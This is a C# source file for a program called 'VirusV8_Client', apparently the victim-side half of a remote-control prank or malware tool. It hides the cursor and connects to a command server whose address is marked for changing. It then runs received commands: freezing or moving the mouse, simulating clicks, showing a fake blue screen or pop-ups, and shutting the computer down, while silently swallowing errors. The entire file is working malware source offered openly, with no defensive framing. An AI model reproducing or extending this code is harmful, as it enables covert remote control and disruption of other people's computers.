using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.IO;

namespace VirusV8_Client
{

    public partial class Form1 : Form
    {
        MouseFreeze mouseFreeze;
        
        public Form1()
        {
            InitializeComponent();
            Cursor.Hide();

        }
        Socket s;
        private void timerTryConnect_Tick(object sender, EventArgs e)
        {
            try
            {
                Client client = new Client("localhost", 1000);//IP CHANGE
                s = client.socket;
                timerTryConnect.Enabled = false;
                timerTryReceive.Enabled = true;
            }
            catch
            {
            }
        }

        public byte[] receive()
        {
            try
            {
                int TimeOut = 500;
                int SleepTime = 50;
                int cnt = 0;
                MemoryStream mem = new MemoryStream();// Empfangspuffer
                byte[] buffer = new byte[1024];
                while (cnt < (TimeOut / SleepTime))
                {
                    while (s.Available > 0)
                    {
                        int bytesRead = s.Receive(buffer, buffer.Length, SocketFlags.None);
                        if (bytesRead <= 0) continue;
                        mem.Write(buffer, 0, bytesRead);
                    }
                    //Thread.Sleep(SleepTime);
                    if (mem.Length > 0 && s.Available == 0)
                    {
                        return mem.ToArray();
                    }
                    else
                    {
                        cnt++;
                    }
                }
                return null;
            }
            catch
            {
                return null;
            }
        }

        private void timerTryReceive_Tick(object sender, EventArgs e)
        {
            byte[] array = receive();
            if (array != null)
            {
                try
                {

                     string something = System.Text.Encoding.ASCII.GetString(array);
                    




                     switch(something)
                    {
                        case "MouseFreezeBottomLeft":
                            mouseFreeze=new MouseFreeze(5);
                            break;
                        case "MouseFreezeBottomRight":
                            mouseFreeze = new MouseFreeze(1);
                            break;
                        case "MouseFreezeMiddle":
                            mouseFreeze = new MouseFreeze(3);
                            break;
                        case "MouseFreezeTopLeft":
                            mouseFreeze = new MouseFreeze(4);
                            break;
                        case "MouseFreezeTopRight":
                            mouseFreeze = new MouseFreeze(2);
                            break;
                        case "MouseStopFreeze":
                            mouseFreeze.Stop();
                            break;
                        case "MouseKlick":
                            MouseKlick.DoMouseClick();
                            break;
                        case "MouseDoubleKlick":
                            MouseKlick.DoMouseDoubleClick();
                            break;
                        case "MouseDisable":
                           //sdfsdahj
                            break;
                        case "BlueScreen":
                            BlueScreen BLUUU = new BlueScreen();
                            BLUUU.ShowDialog();
                            break;
                        case "ShutDown":
                            new ShutDown();
                            break;
                        case "ExitVirus":
                            new ExitVirus();
                            break;


                    }


                    if (something.Contains("MouseSimulation"))
                    {
                        //MouseSimulation:123:12
                        try
                        {
                            string[] mousepositions = something.Split(':');
                            Cursor.Position = new Point(Convert.ToInt32(mousepositions[1]), Convert.ToInt32(mousepositions[2]));
                        }
                        catch
                        {

                        }
                    }

                    if (something.Contains("PopUpMessage"))
                    {
                        //MouseSimulation:Text
                        try
                        {
                            string[] Text = something.Split(':');
                            Form1.Vars.PopUpMessageText = Text[1];
                            Form1.Vars.Anzeigezeit = Convert.ToInt32(Text[2]);
                            PopUpMessageViewer PUMV = new PopUpMessageViewer();
                            PUMV.Show();
                        }
                        catch
                        {

                        }
                    }
                }
                catch (Exception EX)
                {
                    MessageBox.Show("Fehler! : " + EX.Message);
                }
            }
            
        }

        public struct Vars
        {
            public static string PopUpMessageText;
            public static int Anzeigezeit;
        }
    }
}
